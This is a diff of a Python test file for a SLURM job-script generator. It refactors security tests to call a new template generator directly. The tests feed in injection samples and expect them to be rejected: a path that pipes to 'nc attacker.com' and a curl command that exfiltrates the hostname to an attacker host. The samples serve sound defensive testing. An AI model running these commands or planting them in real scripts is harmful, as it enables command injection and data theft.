@@ -10,6 +10,10 @@ import shlex
 from pathlib import Path
 from unittest.mock import MagicMock
 from src.runners.slurm_runner import SLURMRunner, SLURMJobConfig, SLURMValidationError
+from src.runners.slurm_templates import (
+    SLURMTemplateGenerator,
+    SLURMTemplateValidationError,
+)
 
 
 class TestSLURMValidationSecurity:
@@ -51,16 +55,12 @@ class TestSLURMValidationSecurity:
             "/scratch/|nc attacker.com 1234",
         ]
 
-        # Create a mock runner to access instance methods
-        mock_manager = MagicMock()
-        runner = MagicMock(spec=SLURMRunner)
-        runner._validate_config = SLURMRunner._validate_config.__get__(runner)
-        runner._generate_slurm_script = SLURMRunner._generate_slurm_script.__get__(runner)
+        # Use template generator directly for validation
+        generator = SLURMTemplateGenerator()
 
-        config = SLURMJobConfig(job_name="test")
         for path in malicious_paths:
-            with pytest.raises(SLURMValidationError):
-                SLURMRunner._generate_slurm_script(runner, config, path)
+            with pytest.raises(SLURMTemplateValidationError):
+                generator.generate(job_name="test", work_dir=path)
 
     def test_dangerous_environment_setup_blocked(self):
         """Test that dangerous environment setup commands are blocked."""
@@ -72,15 +72,15 @@ class TestSLURMValidationSecurity:
             "curl http://attacker.com/exfiltrate?data=$(hostname)",
         ]
 
-        mock_runner = MagicMock(spec=SLURMRunner)
-        mock_runner._validate_config = SLURMRunner._validate_config.__get__(mock_runner)
-        mock_runner._generate_slurm_script = SLURMRunner._generate_slurm_script.__get__(mock_runner)
+        generator = SLURMTemplateGenerator()
 
-        config = SLURMJobConfig(job_name="test")
         for setup in dangerous_setups:
-            config.environment_setup = setup
-            with pytest.raises(SLURMValidationError):
-                SLURMRunner._generate_slurm_script(mock_runner, config, "/scratch/test")
+            with pytest.raises(SLURMTemplateValidationError):
+                generator.generate(
+                    job_name="test",
+                    work_dir="/scratch/test",
+                    environment_setup=setup
+                )
 
     def test_safe_environment_setup_accepted(self):
         """Test that safe environment setup commands are accepted."""
@@ -91,15 +91,15 @@ class TestSLURMValidationSecurity:
             ". /etc/bashrc",
         ]
 
-        mock_runner = MagicMock(spec=SLURMRunner)
-        mock_runner._validate_config = SLURMRunner._validate_config.__get__(mock_runner)
-        mock_runner._generate_slurm_script = SLURMRunner._generate_slurm_script.__get__(mock_runner)
+        generator = SLURMTemplateGenerator()
 
-        config = SLURMJobConfig(job_name="test")
         for setup in safe_setups:
-            config.environment_setup = setup
             # Should not raise
-            script = SLURMRunner._generate_slurm_script(mock_runner, config, "/scratch/test")
+            script = generator.generate(
+                job_name="test",
+                work_dir="/scratch/test",
+                environment_setup=setup
+            )
             assert setup in script
 
     def test_array_spec_validation(self):
@@ -160,12 +160,8 @@ class TestSLURMScriptGeneration:
 
     def test_script_generation_escapes_job_name(self):
         """Test that job name is properly escaped in SLURM script."""
-        mock_runner = MagicMock(spec=SLURMRunner)
-        mock_runner._validate_config = SLURMRunner._validate_config.__get__(mock_runner)
-        mock_runner._generate_slurm_script = SLURMRunner._generate_slurm_script.__get__(mock_runner)
-
-        config = SLURMJobConfig(job_name="my_job-123")
-        script = SLURMRunner._generate_slurm_script(mock_runner, config, "/scratch/test")
+        generator = SLURMTemplateGenerator()
+        script = generator.generate(job_name="my_job-123", work_dir="/scratch/test")
 
         # Check that job name appears in script (either quoted or unquoted if alphanumeric)
         assert "my_job-123" in script
@@ -173,12 +169,8 @@ class TestSLURMScriptGeneration:
 
     def test_script_generation_escapes_work_dir(self):
         """Test that work directory is properly escaped in cd command."""
-        mock_runner = MagicMock(spec=SLURMRunner)
-        mock_runner._validate_config = SLURMRunner._validate_config.__get__(mock_runner)
-        mock_runner._generate_slurm_script = SLURMRunner._generate_slurm_script.__get__(mock_runner)
-
-        config = SLURMJobConfig(job_name="test")
-        script = SLURMRunner._generate_slurm_script(mock_runner, config, "/scratch/test/path")
+        generator = SLURMTemplateGenerator()
+        script = generator.generate(job_name="test", work_dir="/scratch/test/path")
 
         # Work dir should appear in cd command
         assert "cd " in script
@@ -186,32 +178,26 @@ class TestSLURMScriptGeneration:
 
     def test_script_generation_escapes_modules(self):
         """Test that module names are properly escaped."""
-        mock_runner = MagicMock(spec=SLURMRunner)
-        mock_runner._validate_config = SLURMRunner._validate_config.__get__(mock_runner)
-        mock_runner._generate_slurm_script = SLURMRunner._generate_slurm_script.__get__(mock_runner)
-
-        config = SLURMJobConfig(
+        generator = SLURMTemplateGenerator()
+        script = generator.generate(
             job_name="test",
+            work_dir="/scratch/test",
             modules=["crystal23", "intel/2023.1", "openmpi-4.1.5"]
         )
-        script = SLURMRunner._generate_slurm_script(mock_runner, config, "/scratch/test")
 
         # Each module should appear in script
-        for module in config.modules:
-            assert f"module load " in script
+        for module in ["crystal23", "intel/2023.1", "openmpi-4.1.5"]:
+            assert "module load " in script
             assert module in script
 
     def test_script_generation_escapes_partition(self):
         """Test that partition name is properly escaped."""
-        mock_runner = MagicMock(spec=SLURMRunner)
-        mock_runner._validate_config = SLURMRunner._validate_config.__get__(mock_runner)
-        mock_runner._generate_slurm_script = SLURMRunner._generate_slurm_script.__get__(mock_runner)
-
-        config = SLURMJobConfig(
+        generator = SLURMTemplateGenerator()
+        script = generator.generate(
             job_name="test",
+            work_dir="/scratch/test",
             partition="compute"
         )
-        script = SLURMRunner._generate_slurm_script(mock_runner, config, "/scratch/test")
 
         # Partition should appear in script
         assert "--partition=" in script
@@ -219,18 +205,15 @@ class TestSLURMScriptGeneration:
 
     def test_complete_script_validation(self):
         """Test that a complete SLURM script is generated safely."""
-        mock_runner = MagicMock(spec=SLURMRunner)
-        mock_runner._validate_config = SLURMRunner._validate_config.__get__(mock_runner)
-        mock_runner._generate_slurm_script = SLURMRunner._generate_slurm_script.__get__(mock_runner)
-
-        config = SLURMJobConfig(
+        generator = SLURMTemplateGenerator()
+        script = generator.generate(
             job_name="test_job",
+            work_dir="/scratch/crystal/test",
             partition="compute",
             account="project123",
             modules=["crystal23", "intel/2023.1"],
             environment_setup="export OMP_NUM_THREADS=4",
         )
-        script = SLURMRunner._generate_slurm_script(mock_runner, config, "/scratch/crystal/test")
 
         # Verify script structure
         assert "#!/bin/bash" in script
